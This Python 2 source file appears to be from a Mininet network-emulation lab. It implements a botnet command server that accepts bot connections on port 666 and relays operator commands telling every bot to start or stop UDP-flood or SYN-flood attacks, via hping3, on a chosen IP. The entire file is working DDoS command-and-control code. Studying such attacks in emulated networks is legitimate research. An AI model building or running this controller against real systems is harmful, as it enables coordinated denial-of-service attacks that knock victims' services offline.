# -*- coding: utf-8 -*- 
'''
This is the Command Server, for our attackers, running on hosts within Mininet.
The Command Server itself runs outside of Mininet, and will send commands, based on
user input to the attackers. Attackers are configured to run attacks using the hping3
command-line tool (UDP flood and SYN flood attacks).

Commands:
start udp <ip>		--start a udp flood attack on ip
start syn <ip>		--start a syn flood attack on ip
stop <ip>			--stop any ongoing attacks on ip

'''

import sys
import thread
import socket
import subprocess
import time

# List of connected bots
bots = []

# Server details
PORT = 666
HOST = '192.168.2.4'

# Read input from terminal - construct and send commands to the bots (attackers)
def readCommands():
	while True:
		inString = raw_input('>>')

		# Figure out, how many statements the command has got
		# and read into variables, splitting on 'space'
		NumberofFields = inString.count(' ') + 1
		if NumberofFields == 3:
			command, atkType, victim = inString.split(' ')
			print 'Command: ' + command
			print 'Attack: ' + atkType
			print 'Target: ' + victim
		elif NumberofFields == 2:
			command, victim = inString.split(' ')
			print 'Command: ' + command
			print 'Target: ' + victim

		# Construct and send start- or stop commands
		if command == 'start':
			for bot in bots:
				bot.send('START' + '/' + atkType + '/' + victim)
		elif command == 'stop':
			for bot in bots:
				bot.send('STOP' + '/' + victim)

if __name__=='__main__':
	#Host a server, listening for bots to make a connection
	serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	serversocket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1)
	serversocket.bind((HOST, PORT))
	serversocket.listen(999)

	print 'Running server on: ' + HOST 
	
	# We open an xterm window, tailing a logfile containing connected bots
	botsLoggerFile = open("output", "w")
	# Open xterm window with logs from that file
	p = subprocess.Popen(["xterm", "-e", "tail", "-f", "output"])
	print '\n'
	time.sleep(0.5)
	thread.start_new_thread(readCommands, ())

	print 'Command: <start or stop> <syn or udp> <targetIP>'

	while 1:
		botsock, addr = serversocket.accept()
		bots.append(botsock)
		botsLoggerFile.write('Bot connected: ' + str(addr) + '\n')
		botsLoggerFile.flush()

